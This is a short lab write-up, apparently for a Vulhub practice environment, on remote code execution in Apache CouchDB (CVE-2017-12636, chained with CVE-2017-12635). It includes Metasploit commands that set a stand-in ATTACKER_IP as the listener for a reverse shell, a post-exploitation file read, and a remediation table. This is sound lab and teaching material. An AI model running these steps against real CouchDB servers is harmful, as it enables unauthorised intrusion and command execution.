# Apache CouchDB Remote Code Execution

## Summary

| Field | Detail |
|-------|--------|
| **CVE** | CVE-2017-12636 |
| **Affected Version** | Apache CouchDB < 1.7.0, 2.x < 2.1.1 |
| **Attack Vector** | Network (HTTP) |
| **Impact** | Remote Code Execution |

## Description

Apache CouchDB allows administrative users to configure the database server via its HTTP API. Some configuration options, such as `query_servers`, specify paths for OS-level binaries that CouchDB subsequently launches. By injecting arbitrary shell commands into these configuration values, an authenticated admin can achieve remote code execution as the CouchDB user. This vulnerability is commonly chained with CVE-2017-12635 (privilege escalation via duplicate JSON keys) to gain admin access without credentials.

## Enumeration

```bash
nmap -sV -sC TARGET_IP
```

| Port | Service | Version |
|------|---------|---------|
| 22 | SSH | OpenSSH 8.4p1 Debian |

> CouchDB's API port (5984) was not detected by the default scan. The service was identified through Metasploit's exploit module which targets port 5984 by default.

## Exploitation

**Module:** `exploit/linux/http/apache_couchdb_cmd_exec`

```bash
msf6 > use exploit/linux/http/apache_couchdb_cmd_exec
msf6 > set RHOSTS TARGET_IP
msf6 > set LHOST ATTACKER_IP
msf6 > run
```

The module automatically exploits both CVE-2017-12635 (to create an admin user) and CVE-2017-12636 (to execute commands via `query_servers`). It generates a curl command stager, sends the payload to the target, and returns a command shell session.

**Post-exploitation:**

```bash
cat /secret.txt
```

## Remediation

| Action | Priority |
|--------|----------|
| Update Apache CouchDB to >= 1.7.0 or >= 2.1.1 | Critical |
| Use strong, unique admin credentials | Critical |
| Restrict network access to CouchDB (port 5984) | High |
| Bind CouchDB to localhost if remote access is not needed | High |

## References

- [CVE-2017-12636 - NVD](https://nvd.nist.gov/vuln/detail/CVE-2017-12636)
- [CVE-2017-12635 - NVD](https://nvd.nist.gov/vuln/detail/CVE-2017-12635)
- [Vulhub - CouchDB CVE-2017-12636](https://github.com/vulhub/vulhub/tree/master/couchdb/CVE-2017-12636)
